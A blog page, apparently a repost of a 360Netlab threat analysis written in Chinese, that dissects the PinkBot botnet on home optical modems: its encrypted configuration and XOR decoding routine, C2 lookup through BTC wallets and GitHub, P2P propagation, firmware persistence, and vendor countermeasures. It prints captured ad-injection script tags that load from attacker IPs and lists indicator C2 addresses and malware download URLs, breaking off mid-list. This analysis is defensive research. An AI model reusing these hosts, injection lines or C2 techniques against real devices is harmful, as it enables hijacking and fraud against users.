@@ -1,0 +1,1111 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>
+    一个藏在我们身边的巨型僵尸网络——PinkBot | gd1214b&#39;s blog
+</title>
+<meta name="description" content="念念不忘，必有回响" />
+<link rel="shortcut icon" href="https://www.gd1214b.icu/favicon.ico">
+<link rel="stylesheet" href="https://www.gd1214b.icu/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="RSS" href="https://blog.gd1214b.icu/atom.xml">
+<script src="https://www.gd1214b.icu/media/js/jquery.min.js"></script>
+<script src="https://www.gd1214b.icu/media/js/masonry.pkgd.min.js"></script>
+<script src="https://www.gd1214b.icu/media/js/aos.js"></script>
+<script src="https://www.gd1214b.icu/media/js/pace.min.js"></script>
+<script src="https://www.gd1214b.icu/media/js/view-image.min.js"></script>
+<script src="https://www.gd1214b.icu/media/js/jquery.magnific-popup.min.js"></script>
+<script src="https://www.gd1214b.icu/media/js/functions.js"></script>
+<script src="//instant.page/5.1.1" type="module"
+    integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-DX8ZG93X7W"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-DX8ZG93X7W');
+</script>
+
+<script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+        c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+        t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "7hirib7ekv");
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-217344475-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'UA-217344475-1');
+</script>
+
+<script async defer src="https://sa.gd1214b.icu/latest.js"></script>
+<noscript><img src="https://sa.gd1214b.icu/noscript.gif" alt=""
+        referrerpolicy="no-referrer-when-downgrade" /></noscript>
+    <meta name="referrer" content="never">
+    <meta name="description" content="
+本文转自：https://blog.netlab.360.com/pinkbot/
+
+本文完成于2020年春节前后，为维护广大最终消费者的利益，一直处于保密期无法发表。近日 CNCERT 公开披露了相关事件，令本文有了公开契机。在保密期的..." />
+    <meta name="keywords" content="PinkBot" />
+    <script src="https://www.gd1214b.icu/media/js/waterfall.min.js"></script>
+    <script src="https://www.gd1214b.icu/media/js/prism.min.js"></script>
+  </head>
+  <body>
+      <header id="header" class="grid-container">
+  <!-- start: .menu-wrapper -->
+  <div class="menu-mobile">
+    <i class="fa fa-reorder"></i>
+  </div>
+  <div class="menu-wrapper">
+    <div class="">
+      <p align="center">
+      <div class="logo">
+        <a href="https://www.gd1214b.icu"><img src="\media\images\custom-headerLogo.ico" alt=""></a>
+        <font href="/" size="5" color="white">gd1214b's blog</font>
+      </div>
+      </p>
+    </div>
+    <!-- start: .main-nav -->
+
+    <nav class="main-nav grid-container grid-parent">
+      <ul id="menu-header" class="menu gradient-effect">
+        <!-- <li class=""><a href="https://www.gd1214b.icu" class="menu">首页</a></li> -->
+        
+          <li class="">
+            <a href="/" class="menu">
+              🏠首页
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/archives" class="menu">
+              🗄️归档
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/tags" class="menu">
+              🏷️标签
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/post/copyright" class="menu">
+              ©︎版权声明
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/post/privacy-policy" class="menu">
+              🔒隐私政策
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/post/disclaimers" class="menu">
+              🌐免责声明
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/post/lab" class="menu">
+              🧪实验室
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="https://drive.gd1214b.icu" class="menu">
+              ☁️网盘
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="https://status.gd1214b.tech/" class="menu">
+              📊探针
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="https://travellings.link" class="menu">
+              🚇开往
+            </a>
+          </li>
+          
+          <li class="">
+            <a href="/post/about" class="menu">
+              👋关于
+            </a>
+          </li>
+          
+            <li class="search-menu-item hide-on-mobile hide-on-tablet"><a href="#search-lightbox"
+                class="lightbox mfp-inline"><i class="fa fa-search-line"></i></a></li>
+      </ul>
+    </nav>
+    <a href="#search-lightbox" class="lightbox epcl-search-button mfp-inline hide-on-tablet hide-on-desktop"><i
+        class="fa fa-search-line"></i></a>
+    <!-- end: .main-nav -->
+    <div class="clear"></div>
+    <div class="border hide-on-tablet hide-on-mobile"></div>
+  </div>
+  <div class="clear"></div>
+  </div>
+  <!-- end: .menu-wrapper -->
+  <div class="clear"></div>
+</header>
+<div class="hide-on-mobile hide-on-tablet hide-on-desktop">
+  <div id="search-lightbox" class="grid-container grid-small grid-parent mfp-hide">
+    <div class="search-wrapper section">
+      <form id="gridea-search-form" data-update="1666956796253" action="/search/index.html" class="search-form"
+        _lpchecked="1">
+        <input type="text" name="q" id="s" value="" class="search-field" placeholder="搜点啥..." aria-label="搜点啥..."
+          required="">
+        <button type="submit" class="submit" aria-label="Submit">
+          <i class="fa fa-search-line"></i>
+        </button>
+      </form>
+    </div>
+  </div>
+</div>
+
+      <main id="single" class="main grid-container fullcover no-sidebar aos-init aos-animate" data-aos="fade">
+
+        <div class="center content">
+          <div class="featured-image cover" style="background-image: url('https://www.gd1214b.icu/post-images/WyCiS5dGg.png');">
+            <div class="meta top"> 
+              <time class="meta-info" style="float:left;" datetime="2021-10-31"><i class="fa fa-calendar"></i><span class="lately">1 年前</span></time>
+              
+              <a href="https://www.gd1214b.icu/post/WyCiS5dGg/#comments" class="comments meta-info" title="">
+                <i class="fa fa-comment remixicon"></i><span class="comment-count valine-comment-count" data-xid="/WyCiS5dGg/"> </span>
+              </a>
+              <span id="/WyCiS5dGg/" class="leancloud_visitors views-counter meta-info" title=""><i class="fa fa-leancloud remixicon"></i><span class="leancloud-visitors-count"></span></span>
+              
+            </div>
+            <div class="info">
+              <div class="tags ">
+                
+                      <a href="https://www.gd1214b.icu/tag/pinkbot/" class="ctag ctag-0 ctag-pinkbot" aria-label="">PinkBot</a>
+                    
+              </div>
+              <h1 class="title ularge white bold">一个藏在我们身边的巨型僵尸网络——PinkBot</h1>
+            </div>
+          </div>
+        </div>  
+
+        <div class="epcl-page-wrapper">
+          <div class="left-content grid-70 np-mobile">
+            <article class="main-article post">
+              <section class="post-content">
+                <div class="text">
+                  <blockquote>
+<p>本文转自：<a href="https://blog.netlab.360.com/pinkbot/">https://blog.netlab.360.com/pinkbot/</a></p>
+</blockquote>
+<p>本文完成于2020年春节前后，为维护广大最终消费者的利益，一直处于保密期无法发表。近日 CNCERT 公开披露了相关事件，令本文有了公开契机。在保密期的这段时间里，Pink 也出现一些新的小变动，笔者筛选了其中一部分放到“新动向”章节，供其他同仁共同追踪研究。</p>
+<h1 id="概述">概述</h1>
+<p>2019年11月21日，安全社区的信任伙伴给我们提供了一个全新的僵尸网络样本，相关样本中包含大量以 pink 为首的函数名，所以我们称之为 PinkBot。</p>
+<p>Pinkbot 是我们六年以来观测到最大的僵尸网络，其攻击目标主要是 mips 光猫设备，在360Netlab的独立测量中，总感染量超过160万，其中 96% 位于中国。</p>
+<p>PinkBot 具有很强的技术能力：</p>
+<ol>
+<li>PinkBot 架构设计具备很好的健壮性，它能够通过多种方式（通过第三方服务分发配置信息/通过 P2P 方式分发配置信息/通过 CNC 分发配置信息）自发寻址控制端，并对控制端通信有完备的校验，确保僵尸节点不会因某一个环节的阻杀而丢失或被接管；甚至对光猫固件做了多处改动后，还能确保光猫能够正常使用；</li>
+<li>PinkBot对部分域名的解析查询采取了 DNS-Over-HTTPS 的方式，这个也是在传统BotNet中不太常见的一种手段；</li>
+<li>在与相关厂商的屡次攻防博弈中，PinkBot 的运营者都占据了明显的对抗优势。</li>
+</ol>
+<p>可以说，PinkBot 在整个过程中表现出了极强的针对性和专业性，各方面能力都很均衡，甚至有些可怕。</p>
+<h1 id="规模及影响范围">规模及影响范围</h1>
+<p>我们通过对多个数据源的交叉对比，推测 PinkBot 的感染量在百万量级。三个评估的数据源如下：</p>
+<ol>
+<li>2019-11-30我们从可信任的安全伙伴手里拿到一个统计数字，日活去重 1,962,308 个IP;</li>
+<li>2020-01-02从CNCERT拿到的统计结果：
+<blockquote>
+<p>“该僵尸网络的规模目前无法准确测算。根据NetFlow数据、主动探测数据、实时监测数据等多个维度的数据测算，该僵尸网络关联的Bot节点IP地址数量超过500万。因家庭宽带IP是动态分配的，背后的真实感染设备规模无法精确估计，推测实际感染设备数量在百万级，测算的一个主要依据为曾监测到1分钟内连接C2的IP数量超过百万。”</p>
+</blockquote>
+</li>
+<li>根据我们 (360NetLab) 在全网范围内持续探测的数据评估，2020-01-08 当天活跃的受感染 IP 数量为 165 万。</li>
+</ol>
+<p>在我们全网探测的测量数据中，受感染的 IP 主要集中在中国 (96%)，遍及全国 33 个省。</p>
+<h1 id="pinkbot-技术架构">PinkBot 技术架构</h1>
+<p>PinkBot是一个同时融合了“P2P”和“CNC”的混合结构僵尸网络。一般情况下，它将时效性要求不高的指令（如管理配置信息）通过P2P的方式传递，将时效性要求较高的指令通过CNC模式集中分发（例如：发起ddos攻击，向用户访问的HTTP网站中插广告）。</p>
+<h2 id="配置信息">配置信息</h2>
+<p>对于每一个Bot来说，最重要的一步是找到自己的管理员。而管理员的信息就包含在“配置”之中，下面是最新截获的配置信息：</p>
+<pre><code class="language-json">{
+  &quot;verify&quot;: &quot;1585065675&quot;,
+  &quot;cncip1&quot;: &quot;144.202.109.110&quot;,
+  &quot;cncport1&quot;: &quot;32876&quot;,
+  &quot;dlc&quot;: &quot;5b62596bc1453d51cc7241086464f294&quot;,
+  &quot;dl&quot;: &quot;http【:】//155.138.140.245/dlist.txt&quot;,
+  &quot;dlc1&quot;: &quot;484417e6f65c8e18e684d60c03c4680a&quot;,
+  &quot;dl1&quot;: &quot;https【:】//*****.com/johncase/zip/raw/master/dlist.txt&quot;,
+  &quot;sd0&quot;: &quot;1.1.1.1&quot;,
+  &quot;sdp0&quot;: &quot;443&quot;,
+  &quot;srvk&quot;: &quot;FJAz37XiKgnTLtVpmhjxZcavTJUU5r4XN3Wl5nhTpg0=&quot;,
+  &quot;pxy&quot;: &quot;1&quot;
+}
+</code></pre>
+<ol>
+<li>其中 verify 字段为指令发布的时间戳，Bot会根据这个时间戳筛选出最新的有效指令。</li>
+<li>随后的 cncip 和 cncport 字段指明了僵尸网络的最新CNC地址，攻击者会根据自身需求随时切换这个控制地址。</li>
+<li>再随后的“dlc/dl”和 “dlc1/dl1” 字段组为最新的Bot更新地址，其中dlc和dlc1为对应内容的Hash校验字段，算法伪代码为：MD5(MD5(dlist_content)+SHA256(dlist_content))。</li>
+<li>“sd0/sdp0”字段为安全DNS地址，对于每一个Bot来说，当需要查询DNS解析记录时，将通过这里指定的DNS服务来查询。且方式为DNS-Over-HTTPS。</li>
+<li>rvk字段为服务端的公钥内容（base64编码）。对于每一个bot来说，它和CNC的通讯都是加密的。所以实际通讯前要先经过ECDH的密钥协商得到一个唯一的私钥。在这里指定了CNC端的公钥后，还可以顺带完成了Bot对CNC身份的验签。这是对原有 ECDH 的扩展使用。</li>
+<li>pxy字段，推测是一个代理上线的选项。目前没有看到使用迹象，不清楚具体的工作逻辑。</li>
+</ol>
+<h2 id="配置信息的保护">配置信息的保护</h2>
+<p>通过上一节的介绍，不难发现“配置信息”其实就是这个僵尸网络的核心，它保证了攻击者对僵尸网络的绝对控制能力。<br>
+为了防止其他人发现配置信息，传递的配置信息都是异或加密过的密文。异或加解密算法是对称的，其解密代码逻辑如下：</p>
+<pre><code class="language-python">def easydecrpyt(message):
+    res = &quot;&quot;
+    for cursor in range(0, len(message)):
+        mbt = ord(message[cursor])
+        res += (chr((mbt ^ (cursor%0xff) ^ 0xae ^ 0xac ^ 0xbe ^ 0xef) &amp; 0xff))
+    return res
+</code></pre>
+<p>信息加密后，为了防止他人伪造。攻击者还使用了ecdsa对配置信息进行了签名，签名细节如下：</p>
+<ol>
+<li>签名校验使用的密码库为 <code>mbedtls</code>；</li>
+<li>签名算法为 <code>ECDSA</code>；</li>
+<li>签名时使用的曲线为：<code>MBEDTLS_ECP_DP_SECP192R1</code>；</li>
+<li>验签所用公钥为：<code> 04 8D 54 71 71 44 A0 61 DA 5A B4 EA 40 55 2F 21 B1 9B 6C A5 17 92 0F 10 B5 11 56 ED 14 DB 54 47 1A 94 48 06 06 3C 7A B4 3B 25 D1 AC 9F 85 AF 33 9E</code></li>
+</ol>
+<h2 id="配置信息的分发">配置信息的分发</h2>
+<p>除了保证配置信息的机密性和完整性外，攻击者还使用了多种手段来分发配置信息，以确保其可用性。</p>
+<h3 id="通过第三方服务分发配置信息">通过第三方服务分发配置信息</h3>
+<h4 id="通过-btcgithub-分发配置信息">通过 BTC+GITHUB 分发配置信息</h4>
+<p>该分发渠道的核心是一个隐藏在GITHUB上的项目，比如最近一次看到的项目就是（mypolo111/vfg），可以看到这个项目的README中，有两行内容。<br>
+<img src="https://www.gd1214b.icu/post-images/1635658001407.png" alt="" loading="lazy"><br>
+其中，模式为<code>P!!&lt;base64&gt;I!!</code>行是配置签名，模式为<code>N!!&lt;base64&gt;K!!</code>行是配置信息的密文。<br>
+但对于每一个Bot来说，想要找到这个隐藏项目却很复杂。最初，先从一个固定的BTC钱包<code>1GQNam6xhzYVLWWXvRfu3EjsFon6n6GxMF</code>的转账记录生成一个 topic 标签，在逆向样本相关代码之后，我还原了这个过程，如下图所示（BTC钱包的查询用到了四个web服务，具体的地址也如图中所示）：<br>
+<img src="https://www.gd1214b.icu/post-images/1635658087192.png" alt="" loading="lazy"><br>
+对于每一个可能的topic标签，都有很多相关的github项目。遍历这些项目的ISSUES，寻找一个格式为 <code>...!&lt;base64&gt;...?</code> 的字串，比如我们最近找到的一个就是 ...!L215cG9sbzExMS92Zmc=...? 将这个base64 还原，就是隐藏项目的地址了 mypolo111/vfg<br>
+再通过搜索 GITHUB 的 Topics 和 ISSUES，找到那个隐藏的GIT项目。</p>
+<p>另：mypolo111 这个账号在多个项目中提交过ISSUES，相关截图如下所示：<br>
+<img src="https://www.gd1214b.icu/post-images/1635659973106.png" alt="" loading="lazy"><br>
+PS：在这一套寻址逻辑下，攻击者可以通过为 “特定BTC钱包” 增加交易记录的方式，来切换最终找到的 GITHUB 项目。在这样的前提下须封掉指定BTC钱包才能破坏这个僵尸网络以 GITHUB 为主的分发逻辑。</p>
+<h4 id="通过-某中文社区-分发配置信息">通过 某中文社区 分发配置信息</h4>
+<p>攻击者在少部分样本中还尝试利用“某中文社区”分发配置信息，这一部分的逻辑和利用GITHUB分发的逻辑相似。</p>
+<h3 id="通过-p2p-方式分发配置信息">通过 P2P 方式分发配置信息</h3>
+<h4 id="p2p-over-udp123-分发配置信息">P2P-Over-UDP123 分发配置信息</h4>
+<p>Bot节点运行后，会在本地监听 UDP-123 端口，该端口原本是NTP服务默认端口，所用的协议也具有一定的迷惑性。一段时间后，会向公网的四个B段地址（&quot;114.25.0.0/16&quot;，&quot;36.227.0.0/16&quot;，&quot;59.115.0.0/16&quot;，&quot;1.224.0.0/16&quot;）发起 Peer 探测请求，内容为 1C 00 00 00 当目标为正常的 NTP 服务器时会得到 NTP 时间，而如果目标为一个Bot节点时，则有两种回复：</p>
+<ul>
+<li>当目标Bot未取得主控信息时回复 1D 00 00 00；</li>
+<li>当目标Bot拿到主控信息时，会将主控信息的签名和相应密文回复，发送前，会在信息头补充 0xE3 字节。</li>
+</ul>
+<p>下图是最近捕获到的UDP-123 传递的配置信息。<br>
+<img src="https://www.gd1214b.icu/post-images/1635658208907.png" alt="" loading="lazy"></p>
+<h4 id="通过-p2p-over-tcp-分发配置信息">通过 P2P-Over-TCP 分发配置信息</h4>
+<p>Bot 节点运行后，还会在本地监听一个 TCP 端口，且端口号是通过其公网 IP 计算后得到的，代码如下图所示：<br>
+<img src="https://www.gd1214b.icu/post-images/1635658242698.png" alt="" loading="lazy"><br>
+交互协议的格式同UDP123上的相同。</p>
+<h3 id="通过-cnc-分发配置信息">通过 CNC 分发配置信息</h3>
+<p>攻击者在部分样本中内置了一个域名 cnc.pinklander.com ，当该域名启用后，会展示一个web页面，页面内容和GITHUB项目的内容相同。也是base64 编码后的配置信息。</p>
+<h2 id="pinkbot-指令">PinkBot 指令</h2>
+<h3 id="指令格式">指令格式</h3>
+<p>每条指令至少包含7字节，含义依此如下：</p>
+<ol>
+<li>Token字段，长度4字节，该字段值由服务器端指定，指定后将一直使用这个值。设置方式为：Bot启动后首先会向CC发送新生成的ECDH的公钥，此刻Token为0，当服务端接受后，会分配一个Token值给Bot，这就算指定成功了。</li>
+<li>指令字段，长度1字节。CC发出指令后，Bot也要用相同的指令码把执行结果返回。</li>
+<li>内容长度字段，长度2字节。当指令不包含具体内容时，设置为零，否则这里填充内容的字节长度数，并追加密文内容。</li>
+<li>指令内容。当指令包含内容时，此处填写密文的指令内容。解密方法请继续向下阅读。</li>
+</ol>
+<p>这里附上一张截图供参阅，其中红框标记的就是指令字段：<br>
+<img src="https://www.gd1214b.icu/post-images/1635658326650.png" alt="" loading="lazy"></p>
+<h3 id="指令传输方式">指令传输方式</h3>
+<h4 id="通讯加密">通讯加密</h4>
+<p>上述配置信息中的 cncip1 和 cncport1 便是攻击者实际使用的主控节点。PinkBot 连接到 cnc 后将通过密钥交换方式来做加密通信，细节如下：</p>
+<ol>
+<li>使用的密码学库为：mbedtls;</li>
+<li>密钥交换阶段使用的交换算法 ecdh，加载曲线为 MBEDTLS_ECP_DP_CURVE25519;</li>
+<li>务端ECDH公钥前期为硬编码在样本中，跟踪后期，则改为在配置信息中指定。但内容没有变化过：<code>14 90 33 DF B5 E2 2A 09 D3 2E D5 69 9A 18 F1 65 C6 AF 4C 95 14 E6 BE 17 37 75 A5 E6 78 53 A6 0D</code></li>
+<li>报文加密/解密阶段使用的算法为 aes, key 为密钥交换后的secret，加载参数为 MBEDTLS_AES_ENCRYPT 和MBEDTLS_AES_DECRYPT;</li>
+<li>在ECDH的标准中，一般双方的公私钥是每次都要重新生成。但在 PinkBot 中，却只要求了 Bot 侧每次不同，而服务端则指定一对固定的公私钥。这种内置服务端公钥的方式，就等于让 Bot 有能力对 CNC 进行身份验证，从而杜绝了通讯过程被中间人攻击的可能性。</li>
+</ol>
+<h4 id="指令内容编码">指令内容编码</h4>
+<p>为了能够同时适配 mipsb/mipsl 机型中字节序列的分布不同，传输的内容其实是经过开源库<a href="https://github.com/nanopb/nanopb">nanopb </a>转化后的内容，这个库可以通过约定模版的方式来抽象序列化和反序列化的过程，从而忽略掉大/小端内存的干扰。</p>
+<h5 id="pinkbot-指令具有丰富的控制能力">PinkBot 指令具有丰富的控制能力：</h5>
+<ol>
+<li>文件下载</li>
+<li>系统命令执行</li>
+<li>DDoS攻击（HTTP攻击和 UDP 攻击）</li>
+<li>扫描功能（扫描的具体内容可以通过指令设置）</li>
+<li>汇报设备信息（CPU/系统类型/内存信息/系统版本/硬件信息）</li>
+<li>自身更新（将新版本保存到 /tmp/client 后运行）</li>
+<li>P2P节点列表同步（直接推送一组P2P节点到Bot）</li>
+<li>http报文注入广告（在受害设备上，嗅探交互报文，遇到http网页时，插入广告js脚本）</li>
+<li>启动sock5代理服务（在Bot端架设 Socks5 代理服务，账号密码通过指令设置）</li>
+<li>下载文件并执行</li>
+<li>停止攻击</li>
+<li>重置watchdog</li>
+</ol>
+<h2 id="pinkbot-持久化方式">PinkBot 持久化方式</h2>
+<p>与我们常见到的 botnet 不同，PinkBot 为了保持对感染设备的绝对控制权，会在感染光猫后，重新刷写原有的光猫固件。在刷写后的固件中，包含了 PinkBot 的下载器母体和配套的启动程序。</p>
+<p>下图是被感染后新增/修改的文件列表：<br>
+<img src="https://www.gd1214b.icu/post-images/1635658525394.png" alt="" loading="lazy"><br>
+其中tmp目录的内容可以暂时忽略，这是样本运行中生成的临时文件。<br>
+关键文件说明：</p>
+<ul>
+<li>bin/protect：(md5:<code>9ec5bd857b998e60663e88a70480b828</code>)<br>
+protect 文件是被刷写固件中的Bot母本。文件中未发现收益类功能，换句话说它更像是一个下载器，在这个样本中可以看到以上5种获取配置信息的代码。它最主要的功能，就是启动后会从配置信息中拿到最新的样本并把它们运行起来。</li>
+<li>/bin/tr69c: (md5:<code>451a3cf94191c64b5cd1be1a80be7799</code>)<br>
+tc69c 文件是光猫原始固件中 tr69c 的一个patch版本。通过对比分析，发现该patch主要移除了光猫的更新功能。也就是说，被刷写的光猫，将无法通过 tr69c 进行固件升级。这应该是攻防对抗中引入的持久化操作。</li>
+</ul>
+<h1 id="跟踪及处置">跟踪及处置</h1>
+<h2 id="规模评估">规模评估</h2>
+<p>前面提到，Pink 具有通过 p2p 方式来分发非实时性指令信息的特性。利用这个特性，我们得以在全网范围内对 PinkBot 的感染量进行评估，最终得出的全球受感染IP超过160万的这个结论。</p>
+<h2 id="指令跟踪">指令跟踪</h2>
+<p>我们通过模拟 PinkBot 来实时接收CNC主控分发的指令。<br>
+除了日常的维护类指令（心跳指令/peerlist同步指令）外，我们还收到了多条向WEB网页插入广告的指令，例如：</p>
+<pre><code class="language-html">&lt;script async src=&quot;http【:】//45.32.21.251/j/?$$&quot;&gt;&lt;/script&gt;
+&lt;script async src=&quot;http【:】//167.179.80.159/j/?$$&quot;&gt;&lt;/script&gt;
+&lt;script async src=“http【:】//114.55.124.13/j/?$$“&gt;&lt;/script&gt;
+</code></pre>
+<h2 id="汇报及处置">汇报及处置</h2>
+<ol>
+<li>通报各级监管机构；</li>
+<li>依法配合执法机构行动；</li>
+<li>联合设备供应商进行安全防御；</li>
+<li>联合若干互联网基础设施供应商共同监控PinkBot行动。</li>
+</ol>
+<h1 id="新动向">新动向</h1>
+<p>本文其他部分，均完成于2020年春节前后，到现在已经度过了一年半的时光。在这段时间中，我们没有发现 Pink 出现太大的变动，本节附上了一些最新的线索，供同仁们共同研究和追踪。</p>
+<h2 id="最新传播的配置信息">最新传播的配置信息</h2>
+<p>随着对 pink 的持续追踪，我们发现，pink 的配置信息会间歇性发生变化，变动内容主要体现在 CNC 字段和 DL* 字段，并于最近几个月趋于稳定。下面是我们在 2021/10/5(北京时间) 捕获的最新配置信息。</p>
+<pre><code class="language-json">{
+ &quot;verify&quot;:&quot;1611936001&quot;,
+ &quot;cncip1&quot;:&quot;140.82.40.29&quot;,
+ &quot;cncport1&quot;:&quot;26007&quot;,
+ &quot;dlc&quot;:&quot;450aa79da035a8a55ca4c0e6b1025b50&quot;,
+ &quot;dl&quot;:&quot;http://209.250.247.60/dlist.txt&quot;,
+ &quot;dlc1&quot;:&quot;47ed94977b45099f1ef5c7701b2d25dc&quot;,
+ &quot;dl1&quot;:&quot;https://****.com/****/dlist.txt&quot;,
+ &quot;sd0&quot;:&quot;1.1.1.1&quot;,
+ &quot;sdp0&quot;:&quot;443&quot;,
+ &quot;srvk&quot;:&quot;FJAz37XiKgnTLtVpmhjxZcavTJUU5r4XN3Wl5nhTpg0=&quot;,
+ &quot;pxy&quot;:&quot;1&quot;
+}
+</code></pre>
+<h2 id="当前规模">当前规模</h2>
+<p>我们一直阶段性的对公网上的 Pink 节点进行持续监测，通过对 2021/10/20日的日志分析，我们仍然可以看到 103024 个 IP 处于日活状态。这表明，当前的 pink 的感染规模仍然在 10万量级左右，涉及多家设备厂商，按照每个IP对应一个三口之家来计算，受影响人群大概 30万人左右。按照每个光猫 100 元的更换成本计算，当前仍有上千万损失等待弥补。</p>
+<h2 id="曾发起-ddos-攻击">曾发起 DDoS 攻击</h2>
+<p>文章编写完成时，我们并没有抓到 Pink 发起 ddos 攻击的指令，但在随后的一段时间中，我们监测到了大概100多条试图发起 DDos 攻击的指令，下面筛选其中的两条，供参考：</p>
+<ul>
+<li>2020/3/24 通过UDP协议，攻击 203.56.252.137:26999</li>
+<li>2020/4/8  通过HTTP协议，攻击 180.101.192.199:27020</li>
+</ul>
+<h1 id="pink-对抗的能力">Pink 对抗的能力</h1>
+<p>在对 Pink 僵尸网络分析跟踪的过程中。我们注意到，攻击者和不同厂商进行过多次的攻防对抗。<br>
+这一章节将简单介绍下在对抗中， Pink 展现出来的一些能力。</p>
+<h2 id="设备厂商的博弈">设备厂商的博弈</h2>
+<p>根据相关厂商之一提供的信息，对抗最早发生在 2019 年 11 月中旬。受攻击的漏洞源于一个 TCP-17998 的管控服务，该服务是对运营商提供的一个管理家用光猫的接口。由于服务配置和实现的失误，向公网开放了访问权限，攻击者通过它获取了相关光猫的控制权。</p>
+<p>第一次对抗: 厂商在发现这个问题后，开始试图在公网上通过相同的漏洞，修复自家设备。但很快就被攻击者发现并马上采取行动，通过 iptables 关闭了 TCP-17998 的外网访问能力，从设备内部阻止了厂商的进一步修复。</p>
+<p>第二次对抗：此次攻防的焦点在 tr069 升级通道。厂商从运营商侧可以在设备启动瞬间利用 tr096 进去修复设备。然而此次攻击者仍然在第一时间察觉到问题，并迅速更新固件关掉了tr096 的更新通道。</p>
+<p>第三次对抗：厂商又尝试利用设备上 LAN 侧的 TCP-80 HTTP 服务来进行设备修复，然而，同样的结局，攻击者很快又更新固件把设备上的 HTTP 服务文件干掉了。至此，所有的光猫都成了网络孤岛，它们只能提供终端用户的正常网上冲浪的能力，却再没有网络端口可以供外侧管理访问。</p>
+<p>最后的方案：厂商已经完全没有还击的筹码了。如果要修复这些孤岛，只能派人入户接触光猫，拆解出调试接口或者干脆为用户更换光猫。</p>
+<p>复盘总结：设备厂商与攻击者多轮的攻防对抗中，双方的信息和能力是不对等的。厂商在无法获知全网受害情况的前提下，从互联网上一个IP一个IP的发现设备/修复设备。而攻击者通过集中C&amp;C的机制，统一下发关服务指令。虽然，厂商修复了一部分设备得到了局部胜利，但攻击者仍然保住了大部分胜利果实获取了全局胜利。<br>
+另一方面，将物联网设备供应商与成熟的系统供应商在安全能力方面对比（例如Windows、安卓或者MacOS），后者拥有成熟的多的安全人员建制和丰富的多的安全对抗经验。再考虑到物联网设备数量众多，多得多的数量加上少的多的防御，更多的攻击转向物联网设备是老道攻击者的自然选择。</p>
+<h2 id="github-封相关账号">GitHub 封相关账号</h2>
+<p>我们在实际跟踪中通过残留的早期指令发现，PinkBot 至少已经存在一年以上了，最早可以追溯到 2018年10月16日，当时使用的 github 帐号为 pink78day（这个账号早就已经看不到了，我们通过搜索Google的网页快照服务追溯）。<br>
+<img src="https://www.gd1214b.icu/post-images/1635659037605.png" alt="" loading="lazy"><br>
+目前 PinkBot 使用的帐号是 2019年11月下旬注册的 mypolo111，而 pink78day 这个账号已经无法在 GitHub 上搜索到，所以我们推测，Github 在发现这个项目后对帐号采取了屏蔽措施，而最近一次攻防也就发生在 2019年11下旬 PinkBot 换帐号这个时间点。</p>
+<p>复盘总结：对于GitHub来说，PinkBot 数量巨大，且访问的项目是一个明显恶意的项目，会消耗较多的服务资源，于情于理，GitHub 都要封杀这个僵尸网络。问题在于，他们误认为 pink78day 是一个集中分发指令的渠道，以为单纯封杀这个账号就没事了。但事实上，这个账号只是一个相对下游的控制手段。攻击者通过增加BTC钱包的交易记录就可以瞬间将Bot重定向到一个新的账号上。消耗资源的问题依然存在，此次攻防无所谓成功失败。</p>
+<h1 id="ioc">IOC</h1>
+<h2 id="cc地址">C&amp;C地址</h2>
+<p>通过长期跟踪，攻击者使用过的CNC地址有：</p>
+<ul>
+<li>cnc.pinklander.com</li>
+<li>144.202.109.110:40080</li>
+<li>144.202.109.110:32876</li>
+<li>207.148.70.25:12368</li>
+<li>45.32.125.150:12368</li>
+<li>45.32.125.188:12368</li>
+<li>45.32.174.105:12368</li>
+<li>5.45.79.32:12368</li>
+</ul>
+<h2 id="同步服务">同步服务</h2>
+<p>PinkBot 会通过HTTP服务同步样本，用于更新或扩大感染。所用的HTTP服务有一些是公有服务，有一些是临时建立的HTTP服务。</p>
+<p>在长期的跟踪中，我们确定至少存在以下URL被用于样本同步。这些URL均提取自 PinkBot 的配置信息中。</p>
+<ul>
+<li>http://1.198.50.63:1088/dlist.txt</li>
+<li>http://1.63.19.10:19010/var/sss/dlist.txt</li>
+<li>http://104.207.142.132/dlist.txt</li>
+<li>http://108.61.158.59/dlist.txt</li>
+<li>http://111.61.248.32:1088/dlist.txt</li>
+<li>http://112.26.43.199:81/dlist.txt</li>
+<li>http://113.106.175.43:19010/tmp/pinkdown/dlist.txt</li>
+<li>http://117.131.10.102:1088/d/dlist.txt</li>
+<li>http://123.13.215.89:8005/d/dlist.txt</li>
+<li>http://125.74.208.220:81/dlist.txt</li>
+<li>http://140.82.24.94/dlist.txt</li>
+<li>http://140.82.30.245/d/dlist.txt</li>
+<li>http://140.82.53.129/dlist.txt</li>
+<li>http://144.202.38.129/dlist.txt</li>
+<li>http://149.28.142.167/p/dlist.txt</li>
+<li>http://149.28.142.167/p1/dlist.txt</li>
+<li>http://155.138.140.245/dlist.txt</li>
+<li>http://167.179.110.44/dlist.txt</li>
+<li>http://173.254.204.124:81/dlist.txt</li>
+<li>http://182.139.215.4:82/dlist.txt</li>
+<li>http://207.148.4.202/dlist.txt</li>
+<li>http://218.25.236.62:1987/d/dlist.txt</li>
+<li>http://218.25.236.62:1988/d/dlist.txt</li>
